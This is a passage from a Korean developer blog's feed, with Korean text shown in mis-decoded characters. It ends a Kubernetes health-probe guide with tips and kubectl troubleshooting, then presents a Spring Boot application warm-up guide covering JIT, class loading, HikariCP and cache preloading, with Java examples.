œì™¸)</li><li>ì¬ì‹œì‘ìœ¼ë¡œ í•´ê²°í•  ìˆ˜ ìˆëŠ” ë¬¸ì œë§Œ ê°ì§€</li><li><code>initialDelaySeconds</code>ëŠ” Startup Probe ì‚¬ìš© ì‹œ 0ìœ¼ë¡œ ì„¤ì •</li><li><code>failureThreshold</code>ë¥¼ ë„ˆë¬´ ë‚®ê²Œ ì„¤ì •í•˜ì§€ ë§ ê²ƒ (false positive ë°©ì§€)</li></ul><h3 id="3-Readiness-Probe"><a href="#3-Readiness-Probe" class="headerlink" title="3. Readiness Probe"></a>3. Readiness Probe</h3><ul><li>ì™¸ë¶€ ì˜ì¡´ì„±(DB, ìºì‹œ, ì™¸ë¶€ API) ì²´í¬ í¬í•¨ ê°€ëŠ¥</li><li><code>periodSeconds</code>ë¥¼ ì§§ê²Œ ì„¤ì •í•˜ì—¬ ë¹ ë¥¸ ë³µêµ¬ ê°€ëŠ¥í•˜ë„ë¡ ì„¤ì •</li><li>ë°°í¬ ì¤‘ ë¬´ì¤‘ë‹¨ ë°°í¬ë¥¼ ìœ„í•´ í•„ìˆ˜ì </li></ul><h3 id="4-ê³µí†µ"><a href="#4-ê³µí†µ" class="headerlink" title="4. ê³µí†µ"></a>4. ê³µí†µ</h3><ul><li><code>/health</code> ì—”ë“œí¬ì¸íŠ¸ëŠ” ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥í•˜ë„ë¡ ì„¤ì •</li><li>Probe ì—”ë“œí¬ì¸íŠ¸ëŠ” ë¡œê¹…ì„ ì œì™¸í•˜ê±°ë‚˜ ë ˆë²¨ì„ ë‚®ê²Œ ì„¤ì • (ë¡œê·¸ ê³¼ë‹¤ ìƒì„± ë°©ì§€)</li><li>í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œëŠ” ì„¸ ê°€ì§€ Probeë¥¼ ëª¨ë‘ ì„¤ì •í•˜ëŠ” ê²ƒì„ ê¶Œì¥</li></ul><h2 id="íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"><a href="#íŠ¸ëŸ¬ë¸”ìŠˆíŒ…" class="headerlink" title="íŠ¸ëŸ¬ë¸”ìŠˆíŒ…"></a>íŠ¸ëŸ¬ë¸”ìŠˆíŒ…</h2><h3 id="CrashLoopBackOff"><a href="#CrashLoopBackOff" class="headerlink" title="CrashLoopBackOff"></a>CrashLoopBackOff</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Pod ìƒíƒœ í™•ì¸</span></span><br><span class="line">kubectl describe pod &lt;pod-name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¡œê·¸ í™•ì¸</span></span><br><span class="line">kubectl logs &lt;pod-name&gt; --previous</span><br></pre></td></tr></table></figure><p><strong>ì›ì¸</strong>:</p><ul><li>Liveness Probe ì‹¤íŒ¨ë¡œ ì¸í•œ ë°˜ë³µì ì¸ ì¬ì‹œì‘</li><li>Startup Probeì˜ <code>failureThreshold</code> ì„¤ì •ì´ ë„ˆë¬´ ë‚®ìŒ</li></ul><p><strong>í•´ê²°</strong>:</p><ul><li>Probe ì„¤ì •ì„ ì™„í™” (<code>failureThreshold</code>, <code>timeoutSeconds</code> ì¦ê°€)</li><li>ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘ ì‹œê°„ ìµœì í™”</li></ul><h3 id="Podê°€-Serviceì—-ë“±ë¡ë˜ì§€-ì•ŠìŒ"><a href="#Podê°€-Serviceì—-ë“±ë¡ë˜ì§€-ì•ŠìŒ" class="headerlink" title="Podê°€ Serviceì— ë“±ë¡ë˜ì§€ ì•ŠìŒ"></a>Podê°€ Serviceì— ë“±ë¡ë˜ì§€ ì•ŠìŒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Service ì—”ë“œí¬ì¸íŠ¸ í™•ì¸</span></span><br><span class="line">kubectl get endpoints &lt;service-name&gt;</span><br></pre></td></tr></table></figure><p><strong>ì›ì¸</strong>:</p><ul><li>Readiness Probe ì‹¤íŒ¨</li></ul><p><strong>í•´ê²°</strong>:</p><ul><li>Readiness Probe ì—”ë“œí¬ì¸íŠ¸ í™•ì¸</li><li>ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œê·¸ì—ì„œ ì—ëŸ¬ í™•ì¸</li><li>ì™¸ë¶€ ì˜ì¡´ì„±(DB, API) ì—°ê²° ìƒíƒœ í™•ì¸</li></ul><h2 id="ì°¸ê³ -ìë£Œ"><a href="#ì°¸ê³ -ìë£Œ" class="headerlink" title="ì°¸ê³  ìë£Œ"></a>ì°¸ê³  ìë£Œ</h2><ul><li><a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">Kubernetes ê³µì‹ ë¬¸ì„œ - Configure Liveness, Readiness and Startup Probes</a></li><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html">Spring Boot Actuator ë¬¸ì„œ</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Kubernetes/">Kubernetes</category>
      
      <category domain="https://ckck803.github.io/categories/Kubernetes/%EC%9B%8C%ED%81%AC%EB%A1%9C%EB%93%9C/">ì›Œí¬ë¡œë“œ</category>
      
      
      <category domain="https://ckck803.github.io/tags/k8s/">k8s</category>
      
      <category domain="https://ckck803.github.io/tags/probe/">probe</category>
      
      <category domain="https://ckck803.github.io/tags/health-check/">health-check</category>
      
      <category domain="https://ckck803.github.io/tags/startup/">startup</category>
      
      <category domain="https://ckck803.github.io/tags/liveness/">liveness</category>
      
      <category domain="https://ckck803.github.io/tags/readiness/">readiness</category>
      
      
      <comments>https://ckck803.github.io/2025/12/26/k8s/pod/health-probes/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Spring Boot] ì• í”Œë¦¬ì¼€ì´ì…˜ Warm Up ê°€ì´ë“œ</title>
      <link>https://ckck803.github.io/2025/12/25/spring/spring-boot-warmup/</link>
      <guid>https://ckck803.github.io/2025/12/25/spring/spring-boot-warmup/</guid>
      <pubDate>Wed, 24 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;ì°¸ê³ -IF-kakao-2022&quot;&gt;&lt;a href=&quot;#ì°¸ê³ -IF-kakao-2022&quot; class=&quot;headerlink&quot; title=&quot;ì°¸ê³  - IF(kakao) 2022&quot;&gt;&lt;/a&gt;ì°¸ê³  - IF(kakao) 2022&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=CQi3SS2YspY&quot;&gt;https://www.youtube.com/watch?v=CQi3SS2YspY&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;ğŸ¤”-Warm-Upì´-í•„ìš”í•œ-ì£¼ìš”-ì´ìœ &quot;&gt;&lt;a href=&quot;#ğŸ¤”-Warm-Upì´-í•„ìš”í•œ-ì£¼ìš”-ì´ìœ &quot; class=&quot;headerlink&quot; title=&quot;ğŸ¤” Warm Upì´ í•„ìš”í•œ ì£¼ìš” ì´ìœ &quot;&gt;&lt;/a&gt;ğŸ¤” Warm Upì´ í•„ìš”í•œ ì£¼ìš” ì´ìœ &lt;/h2&gt;&lt;p&gt;Spring Boot ì™€ ê°™ì€ JAVA ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìµœì´ˆ ì‹¤í–‰í•˜ê±°ë‚˜ ì¬ë°°í¬í•  ë•Œ, ì²« ë²ˆì§¸ ìš”ì²­ì´ ë‹¤ë¥¸ ìš”ì²­ë“¤ì— ë¹„í•´ í˜„ì €íˆ ëŠë¦° í˜„ìƒì„ ê²½í—˜í•œ ì ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ í˜„ìƒì„ &lt;code&gt;Cold Start&lt;/code&gt; ë¬¸ì œë¼ê³  í•˜ë©°, ì´ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ Warm Upì´ í•„ìš”í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/java/jvm-compile.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-JVM-ì˜-JIT-Just-In-Time-ì»´íŒŒì¼&quot;&gt;&lt;a href=&quot;#1-JVM-ì˜-JIT-Just-In-Time-ì»´íŒŒì¼&quot; class=&quot;headerlink&quot; title=&quot;1. JVM ì˜ JIT (Just-In-Time) ì»´íŒŒì¼&quot;&gt;&lt;/a&gt;1. JVM ì˜ JIT (Just-In-Time) ì»´íŒŒì¼&lt;/h2&gt;&lt;p&gt;Java ì• í”Œë¦¬ì¼€ì´ì…˜ì€ &lt;code&gt;ë°”ì´íŠ¸ì½”ë“œ&lt;/code&gt; ë¡œ ì»´íŒŒì¼ë˜ì–´ ì‹¤í–‰ë˜ë©°, JVMì€ ëŸ°íƒ€ì„ì— ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¥¼ &lt;code&gt;ë„¤ì´í‹°ë¸Œ ì½”ë“œ&lt;/code&gt; ë¡œ ìµœì í™”í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;ì´ˆê¸°ì—ëŠ” &lt;code&gt;ì¸í„°í”„ë¦¬í„° ëª¨ë“œ&lt;/code&gt; ë¡œ ì‹¤í–‰ë˜ì–´ ë°”ì´íŠ¸ ì½”ë“œë¥¼ í•œì¤„ í•œì¤„ í•´ì„í•˜ê¸° ë•Œë¬¸ì— ì„±ëŠ¥ì´ ìƒëŒ€ì ìœ¼ë¡œ ë‚®ìŠµë‹ˆë‹¤. JIT ì»´íŒŒì¼ëŸ¬ê°€ ìì£¼ ì‹¤í–‰ë˜ëŠ” ì½”ë“œ &lt;code&gt;í•«ìŠ¤íŒŸ(Hot Spot)&lt;/code&gt; ì„ ì‹ë³„í•˜ê³  ìµœì í™”ëœ ë„¤ì´í‹°ë¸Œ ì½”ë“œë¡œ ì „í™˜ë©ë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;ë•Œë¬¸ì— ì• í”Œë¦¬ì¼€ì´ì…˜ êµ¬ë™ í›„ JIT ì»´íŒŒì¼ëŸ¬ê°€ &lt;strong&gt;í•«ìŠ¤íŒŸ(Hot Spot)&lt;/strong&gt; ì„ ì‹ë³„í•˜ê³  ìµœì í™”í•˜ëŠ” ì „ê¹Œì§€ëŠ” ìƒëŒ€ì ìœ¼ë¡œ ëŠë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/java/jit-compile.png&quot; alt=&quot;Native ì½”ë“œë¡œ ë³€í™˜ë˜ëŠ” ê³¼ì •&quot;&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="ì°¸ê³ -IF-kakao-2022"><a href="#ì°¸ê³ -IF-kakao-2022" class="headerlink" title="ì°¸ê³  - IF(kakao) 2022"></a>ì°¸ê³  - IF(kakao) 2022</h2><ul><li><a href="https://www.youtube.com/watch?v=CQi3SS2YspY">https://www.youtube.com/watch?v=CQi3SS2YspY</a></li></ul><h2 id="ğŸ¤”-Warm-Upì´-í•„ìš”í•œ-ì£¼ìš”-ì´ìœ "><a href="#ğŸ¤”-Warm-Upì´-í•„ìš”í•œ-ì£¼ìš”-ì´ìœ " class="headerlink" title="ğŸ¤” Warm Upì´ í•„ìš”í•œ ì£¼ìš” ì´ìœ "></a>ğŸ¤” Warm Upì´ í•„ìš”í•œ ì£¼ìš” ì´ìœ </h2><p>Spring Boot ì™€ ê°™ì€ JAVA ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìµœì´ˆ ì‹¤í–‰í•˜ê±°ë‚˜ ì¬ë°°í¬í•  ë•Œ, ì²« ë²ˆì§¸ ìš”ì²­ì´ ë‹¤ë¥¸ ìš”ì²­ë“¤ì— ë¹„í•´ í˜„ì €íˆ ëŠë¦° í˜„ìƒì„ ê²½í—˜í•œ ì ì´ ìˆì„ ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ í˜„ìƒì„ <code>Cold Start</code> ë¬¸ì œë¼ê³  í•˜ë©°, ì´ë¥¼ í•´ê²°í•˜ê¸° ìœ„í•´ Warm Upì´ í•„ìš”í•©ë‹ˆë‹¤.</p><p><img src="/images/java/jvm-compile.png"></p><h2 id="1-JVM-ì˜-JIT-Just-In-Time-ì»´íŒŒì¼"><a href="#1-JVM-ì˜-JIT-Just-In-Time-ì»´íŒŒì¼" class="headerlink" title="1. JVM ì˜ JIT (Just-In-Time) ì»´íŒŒì¼"></a>1. JVM ì˜ JIT (Just-In-Time) ì»´íŒŒì¼</h2><p>Java ì• í”Œë¦¬ì¼€ì´ì…˜ì€ <code>ë°”ì´íŠ¸ì½”ë“œ</code> ë¡œ ì»´íŒŒì¼ë˜ì–´ ì‹¤í–‰ë˜ë©°, JVMì€ ëŸ°íƒ€ì„ì— ìì£¼ ì‚¬ìš©ë˜ëŠ” ì½”ë“œë¥¼ <code>ë„¤ì´í‹°ë¸Œ ì½”ë“œ</code> ë¡œ ìµœì í™”í•©ë‹ˆë‹¤.</p><p>ì´ˆê¸°ì—ëŠ” <code>ì¸í„°í”„ë¦¬í„° ëª¨ë“œ</code> ë¡œ ì‹¤í–‰ë˜ì–´ ë°”ì´íŠ¸ ì½”ë“œë¥¼ í•œì¤„ í•œì¤„ í•´ì„í•˜ê¸° ë•Œë¬¸ì— ì„±ëŠ¥ì´ ìƒëŒ€ì ìœ¼ë¡œ ë‚®ìŠµë‹ˆë‹¤. JIT ì»´íŒŒì¼ëŸ¬ê°€ ìì£¼ ì‹¤í–‰ë˜ëŠ” ì½”ë“œ <code>í•«ìŠ¤íŒŸ(Hot Spot)</code> ì„ ì‹ë³„í•˜ê³  ìµœì í™”ëœ ë„¤ì´í‹°ë¸Œ ì½”ë“œë¡œ ì „í™˜ë©ë‹ˆë‹¤.</p><p>ë•Œë¬¸ì— ì• í”Œë¦¬ì¼€ì´ì…˜ êµ¬ë™ í›„ JIT ì»´íŒŒì¼ëŸ¬ê°€ <strong>í•«ìŠ¤íŒŸ(Hot Spot)</strong> ì„ ì‹ë³„í•˜ê³  ìµœì í™”í•˜ëŠ” ì „ê¹Œì§€ëŠ” ìƒëŒ€ì ìœ¼ë¡œ ëŠë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/java/jit-compile.png" alt="Native ì½”ë“œë¡œ ë³€í™˜ë˜ëŠ” ê³¼ì •"></p><h2 id="2-í´ë˜ìŠ¤-ë¡œë”©-ì§€ì—°"><a href="#2-í´ë˜ìŠ¤-ë¡œë”©-ì§€ì—°" class="headerlink" title="2. í´ë˜ìŠ¤ ë¡œë”© ì§€ì—°"></a>2. í´ë˜ìŠ¤ ë¡œë”© ì§€ì—°</h2><p>ìë°” í´ë˜ìŠ¤ê°€ í”„ë¡œê·¸ë¨ ì‹œì‘ ì‹œ ì „ë¶€ ë¡œë”©ë˜ëŠ” ê²Œ ì•„ë‹ˆë¼ <strong>ì²˜ìŒ ì‹¤ì œë¡œ í•„ìš”í•´ì§€ëŠ” ìˆœê°„</strong> ì— ë©”ëª¨ë¦¬ì— ë¡œë”© ë° ì´ˆê¸°í™”ë˜ë©´ì„œ ë°œìƒí•˜ëŠ” ì§€ì—°ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><p>í´ë˜ìŠ¤ ë¡œë”©ì€  ë¡œë”© &gt; ë§í‚¹ &gt; ì´ˆê¸°í™” ìˆœìœ¼ë¡œ 3ë‹¨ê³„ë¥¼ ê±°ì¹˜ê²Œ ë©ë‹ˆë‹¤.</p><h4 id="1-ë¡œë”©-Loading"><a href="#1-ë¡œë”©-Loading" class="headerlink" title="1. ë¡œë”© (Loading)"></a>1. ë¡œë”© (Loading)</h4><p>ë¡œë”© ë‹¨ê³„ì—ì„œëŠ” í´ë˜ìŠ¤ ë¡œë”ê°€ í´ë˜ìŠ¤ íŒŒì¼ <code>.class</code> ì„ ì°¾ì•„ ë°”ì´íŠ¸ì½”ë“œë¥¼ ë©”ëª¨ë¦¬ë¡œ ì½ì–´ì˜µë‹ˆë‹¤. ë¡œë”© ë‹¨ê³„ì—ì„œëŠ” <strong>ë””ìŠ¤í¬ I&#x2F;O</strong> ê°€ ë°œìƒí•  ìˆ˜ ìˆì–´ ì‹œê°„ì´ ë” ì§€ì—°ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h4 id="2-ë§í‚¹-Linking"><a href="#2-ë§í‚¹-Linking" class="headerlink" title="2. ë§í‚¹ (Linking)"></a>2. ë§í‚¹ (Linking)</h4><p>ë§í¬ ë‹¨ê³„ì—ì„œëŠ” ë°”ì´íŠ¸ì½”ë“œ ê²€ì¦, í´ë˜ìŠ¤ ë³€ìˆ˜, static ë³€ìˆ˜ ë¥¼ ìœ„í•œ ë©”ëª¨ë¦¬ í• ë‹¹ ë° ê¸°ë³¸ê°’ìœ¼ë¡œ ì´ˆê¸°í™”, </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ë¡œë”© ë‹¨ê³„ì—ì„œëŠ” static ë³€ìˆ˜ x ì˜ ê°’ì´ 0 ìœ¼ë¡œ ì„¸íŒ…ë©ë‹ˆë‹¤.</span></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure><h4 id="3-ì´ˆê¸°í™”-Initialization"><a href="#3-ì´ˆê¸°í™”-Initialization" class="headerlink" title="3. ì´ˆê¸°í™” (Initialization)"></a>3. ì´ˆê¸°í™” (Initialization)</h4><p>ë§ˆì§€ë§‰ ì´ˆê¸°í™” ë‹¨ê³„ì—ì„œëŠ” ì •ì í•„ë“œì— ì‹¤ì œ ê°’ì„ ì„¸íŒ…í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì´ˆê¸°í™” ë‹¨ê³„ì—ì„œì•¼ static ë³€ìˆ˜ x ì˜ ê°’ì´ ì‹¤ì œ 10ìœ¼ë¡œ ì„¸íŒ… ë©ë‹ˆë‹¤. </span></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure><h2 id="3-ì»¤ë„¥ì…˜-í’€-ì´ˆê¸°í™”ë¡œ-ì¸í•œ-ì§€ì—°"><a href="#3-ì»¤ë„¥ì…˜-í’€-ì´ˆê¸°í™”ë¡œ-ì¸í•œ-ì§€ì—°" class="headerlink" title="3. ì»¤ë„¥ì…˜ í’€ ì´ˆê¸°í™”ë¡œ ì¸í•œ ì§€ì—°"></a>3. ì»¤ë„¥ì…˜ í’€ ì´ˆê¸°í™”ë¡œ ì¸í•œ ì§€ì—°</h2><p>ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì‹¤í–‰ ì´ˆê¸°ì— minimum-idle ë§Œí¼ë§Œ ì»¤ë„¥ì…˜ì„ ìƒì„±í•˜ëŠ”ë° ì´ í¬ê¸°ê°€ ì‘ìœ¼ë©´ ì´ˆê¸°ì— ìš”ì²­ì´ ëª°ë ¸ì„ ì‹œ Connection ì´ ë¶€ì¡±í•˜ê²Œ ë˜ê³  ë¶€ì¡±í•œ DB ì»¤ë„¥ì…˜ì„ ì¶”ê°€ì ìœ¼ë¡œ ìƒì„±í•˜ëŠ” ë™ì•ˆ ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µ ì§€ì—°ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤. </p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># HikariCP ì„¤ì • ì˜ˆì‹œ</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">10</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">20</span></span><br><span class="line">      <span class="comment"># ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘ ì‹œ minimum-idle ë§Œí¼ì˜ ì»¤ë„¥ì…˜ë§Œ ìƒì„±</span></span><br></pre></td></tr></table></figure><h2 id="4-ìºì‹œ-ì›œì—…"><a href="#4-ìºì‹œ-ì›œì—…" class="headerlink" title="4. ìºì‹œ ì›œì—…"></a>4. ìºì‹œ ì›œì—…</h2><ul><li>ì• í”Œë¦¬ì¼€ì´ì…˜ ìˆ˜ì¤€ì˜ ìºì‹œ(ì˜ˆ: Caffeine, EhCache)ê°€ ë¹„ì–´ìˆìŒ</li><li>ì²« ìš”ì²­ë“¤ì€ ìºì‹œ ë¯¸ìŠ¤ë¡œ ì¸í•´ ì‹¤ì œ ë°ì´í„° ì†ŒìŠ¤ì— ì ‘ê·¼</li><li>ìºì‹œê°€ ì±„ì›Œì§€ê¸°ê¹Œì§€ ì„±ëŠ¥ ì €í•˜</li></ul><h2 id="Spring-Bootì—ì„œ-Warm-Up-ë°©ë²•"><a href="#Spring-Bootì—ì„œ-Warm-Up-ë°©ë²•" class="headerlink" title="Spring Bootì—ì„œ Warm Up ë°©ë²•"></a>Spring Bootì—ì„œ Warm Up ë°©ë²•</h2><h3 id="1-ApplicationRunner-ë˜ëŠ”-CommandLineRunner-ì‚¬ìš©"><a href="#1-ApplicationRunner-ë˜ëŠ”-CommandLineRunner-ì‚¬ìš©" class="headerlink" title="1. ApplicationRunner ë˜ëŠ” CommandLineRunner ì‚¬ìš©"></a>1. ApplicationRunner ë˜ëŠ” CommandLineRunner ì‚¬ìš©</h3><p>ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘ í›„ ìë™ìœ¼ë¡œ ì´ˆê¸°í™” ë¡œì§ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WarmUpRunner</span> <span class="keyword">implements</span> <span class="title class_">ApplicationRunner</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserService userService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ProductService productService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WarmUpRunner</span><span class="params">(UserService userService, ProductService productService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userService = userService;</span><br><span class="line">        <span class="built_in">this</span>.productService = productService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ì£¼ìš” API ì—”ë“œí¬ì¸íŠ¸ í˜¸ì¶œí•˜ì—¬ Bean ì´ˆê¸°í™”</span></span><br><span class="line">        warmUpServices();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ìºì‹œ í”„ë¦¬ë¡œë”©</span></span><br><span class="line">        preloadCache();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// JIT ì»´íŒŒì¼ íŠ¸ë¦¬ê±°</span></span><br><span class="line">        triggerJitCompilation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">warmUpServices</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ì£¼ìš” ì„œë¹„ìŠ¤ ë©”ì†Œë“œ í˜¸ì¶œ</span></span><br><span class="line">            userService.findById(<span class="number">1L</span>);</span><br><span class="line">            productService.getPopularProducts();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// Warm up ì‹¤íŒ¨ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘ì„ ë§‰ì§€ ì•ŠìŒ</span></span><br><span class="line">            log.warn(<span class="string">&quot;Warm up failed&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">preloadCache</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ìì£¼ ì‚¬ìš©ë˜ëŠ” ë°ì´í„° ë¯¸ë¦¬ ìºì‹œì— ë¡œë“œ</span></span><br><span class="line">        productService.loadPopularProductsToCache();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">triggerJitCompilation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ë°˜ë³µì ìœ¼ë¡œ ë©”ì†Œë“œ í˜¸ì¶œí•˜ì—¬ JIT ì»´íŒŒì¼ ìœ ë„</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">            productService.someHotMethod();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-PostConstructë¥¼-ì‚¬ìš©í•œ-Bean-ì´ˆê¸°í™”"><a href="#2-PostConstructë¥¼-ì‚¬ìš©í•œ-Bean-ì´ˆê¸°í™”" class="headerlink" title="2. @PostConstructë¥¼ ì‚¬ìš©í•œ Bean ì´ˆê¸°í™”"></a>2. @PostConstructë¥¼ ì‚¬ìš©í•œ Bean ì´ˆê¸°í™”</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheWarmUpService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ProductRepository productRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CacheManager cacheManager;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CacheWarmUpService</span><span class="params">(ProductRepository productRepository,</span></span><br><span class="line"><span class="params">                              CacheManager cacheManager)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.productRepository = productRepository;</span><br><span class="line">        <span class="built_in">this</span>.cacheManager = cacheManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">warmUpCache</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;Product&gt; popularProducts = productRepository.findPopularProducts();</span><br><span class="line">        <span class="type">Cache</span> <span class="variable">productCache</span> <span class="operator">=</span> cacheManager.getCache(<span class="string">&quot;products&quot;</span>);</span><br><span class="line"></span><br><span class="line">        popularProducts.forEach(product -&gt;</span><br><span class="line">            productCache.put(product.getId(), product)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼-ì‚¬ìš©í•œ-ì£¼ê¸°ì -Warm-Up"><a href="#3-ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼-ì‚¬ìš©í•œ-ì£¼ê¸°ì -Warm-Up" class="headerlink" title="3. ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼ ì‚¬ìš©í•œ ì£¼ê¸°ì  Warm Up"></a>3. ìŠ¤ì¼€ì¤„ëŸ¬ë¥¼ ì‚¬ìš©í•œ ì£¼ê¸°ì  Warm Up</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableScheduling</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduledWarmUp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ScheduledWarmUp</span><span class="params">(RestTemplate restTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.restTemplate = restTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘ 1ë¶„ í›„ ì‹¤í–‰</span></span><br><span class="line">    <span class="meta">@Scheduled(initialDelay = 60000, fixedDelay = Long.MAX_VALUE)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialWarmUp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// ë‚´ë¶€ í—¬ìŠ¤ì²´í¬ ì—”ë“œí¬ì¸íŠ¸ í˜¸ì¶œ</span></span><br><span class="line">        restTemplate.getForObject(<span class="string">&quot;http://localhost:8080/actuator/health&quot;</span>, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì£¼ìš” ì—”ë“œí¬ì¸íŠ¸ í˜¸ì¶œ</span></span><br><span class="line">        restTemplate.getForObject(<span class="string">&quot;http://localhost:8080/api/products&quot;</span>, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-HikariCP-ì»¤ë„¥ì…˜-í’€-ì‚¬ì „-ì´ˆê¸°í™”"><a href="#4-HikariCP-ì»¤ë„¥ì…˜-í’€-ì‚¬ì 